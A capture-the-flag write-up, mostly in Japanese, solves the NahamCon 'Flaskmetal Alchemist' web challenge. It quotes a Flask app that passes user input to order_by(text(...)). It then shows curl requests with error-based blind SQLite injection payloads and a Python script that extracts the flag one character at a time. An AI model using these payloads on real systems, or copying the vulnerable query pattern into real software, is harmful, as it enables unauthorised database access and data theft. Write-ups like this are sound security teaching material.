# Flaskmetal Alchemist:Web:168pts
Edward has decided to get into web development, and he built this awesome application that lets you search for any metal you want. Alphonse has some reservations though, so he wants you to check it out and make sure it's legit.  

**NOTE: this flag does not follow the usual MD5 hash style format, but instead is a short style with lower case `flag{letters_with_underscores}`**  
**Connect with:**  
- [http://challenge.nahamcon.com:30669](http://challenge.nahamcon.com:30669/)  

**Attachments:** [fma.zip](fma.zip)  

# Solution
URLが渡され、ソースも配布される。  
サイトは素材を検索できるようだ。  
明らかにSQLiが怪しい。  
ソースを見ると主要な部分は以下のようであった。  
```python
~~~
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        search = ""
        order = None
        if "search" in request.form:
            search = request.form["search"]
        if "order" in request.form:
            order = request.form["order"]
        if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
    else:
        metals = Metal.query.all()
        return render_template("home.html", metals=metals)
~~~
```
明らかにorder_byでSQLiがある。  
フラグはmodels.pyに以下のように設定されている。  
```python
~~~
class Flag(Base):
    __tablename__ = "flag"
    flag = Column(String(40), primary_key=True)

    def __init__(self, flag=None):
        self.flag = flag
```
DBはsqliteであることもソースよりわかる。  
order byでのTime-base SQLiを以下のように狙う。  
```bash
$ curl -X POST 'http://challenge.nahamcon.com:30669/' --data-raw "search=&order=(select flag from flag where substr(flag,1,1) = 'f' and 1 = randomblob(100000000)); -- satoki"
<!DOCTYPE html>
~~~
$ curl -X POST 'http://challenge.nahamcon.com:30669/' --data-raw "search=&order=(select flag from flag where substr(flag,1,1) = 'f' and 1 = randomblob(1000000000000000)); -- satoki"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
$ curl -X POST 'http://challenge.nahamcon.com:30669/' --data-raw "search=&order=(select flag from flag where substr(flag,1,1) = 'a' and 1 = randomblob(1000000000000000)); -- satoki"
<!DOCTYPE html>
~~~
```
`randomblob(1000000000000000)`に増やすとエラーが発生した。  
andなので、条件一つ目の評価がfalseだと二つ目は評価されない。  
これでError-base SQLiが可能となった。  
以下のesqli.pyで行う。  
```python
import sys
import requests

url = "http://challenge.nahamcon.com:30669/"
alphabet = "abcdefghijklmnopqrstuvwxyz0123456789{}_"
flag = ""

for i in range(len(flag), 40):
    for c in alphabet:
        payload = {"search": "", "order": f"(select flag from flag where substr(flag, {i+1}, 1) = '{c}' and 1 = randomblob(1000000000000000)); -- satoki"}
        res = requests.post(url, data=payload)
        if res.status_code != 200:
            flag += c
            print(flag)
            if c == "}":
                sys.exit()
            break
```
実行する。  
```bash
$ python esqli.py
f
fl
fla
flag
flag{
flag{o
flag{or
flag{ord
flag{orde
flag{order
flag{order_
flag{order_b
flag{order_by
flag{order_by_
flag{order_by_b
flag{order_by_bl
flag{order_by_bli
flag{order_by_blin
flag{order_by_blind
flag{order_by_blind}
```
flagが得られた。  

## flag{order_by_blind}